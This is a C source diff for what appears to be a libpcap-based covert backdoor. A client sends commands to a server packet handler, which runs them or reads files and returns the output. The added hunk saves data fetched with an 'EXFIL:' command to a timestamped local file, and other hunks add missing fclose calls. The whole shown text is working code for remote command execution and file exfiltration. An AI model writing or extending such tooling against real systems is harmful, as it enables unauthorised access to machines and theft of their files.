@@ -232,7 +232,37 @@ void client(struct client_opt c_opt){
     printf("Capturing...\n");
     pcap_loop(client_handle, -1, client_packet_handler, (u_char *)&msg_buf);
     
+    /* Transmitted data */
+    
     printf("Total Buffer: %zu bytes\n%s\n", strlen(msg_buf.buffer), msg_buf.buffer);
+    
+    if(strncmp(c_opt.command,"EXFIL:",6) == 0){
+        char file_name[1024] = {0};
+        
+        char current_date[128] = {0};
+        time_t now = time(NULL);
+        struct tm *t = localtime(&now);
+        strftime(current_date, sizeof(current_date)-1, "%d_%m_%Y_%H:%M_%S_", t);
+        printf("Current Date: %s", current_date);
+        
+        strncpy(file_name, current_date, 1024);
+        
+        int c = 0;
+        for(c = 0; c < strlen(c_opt.command); c++){
+            if(c_opt.command[c] == '/')
+                c_opt.command[c] = '_';
+        }
+        
+        strncpy(file_name + strlen(current_date), c_opt.command, 1024 - strlen(current_date));
+        
+        FILE *fp;
+        fp = fopen(file_name, "w");
+        fwrite(msg_buf.buffer, 1, sizeof(msg_buf.buffer), fp);
+        fclose(fp);
+    }
+    else{
+        printf("Total Buffer: %zu bytes\n%s\n", strlen(msg_buf.buffer), msg_buf.buffer);
+    }
 }
 
 /*
@@ -630,6 +660,7 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
 
             printf("File content: \n%s\n", output);
         };
+        fclose(fp);
     }
     else{ // Normal command
         
@@ -645,6 +676,7 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
         
         // Read in command results
         fread((void *)output, sizeof(char), MESSAGE_MAX_SIZE, fp);
+        fclose(fp);
     }
     
     
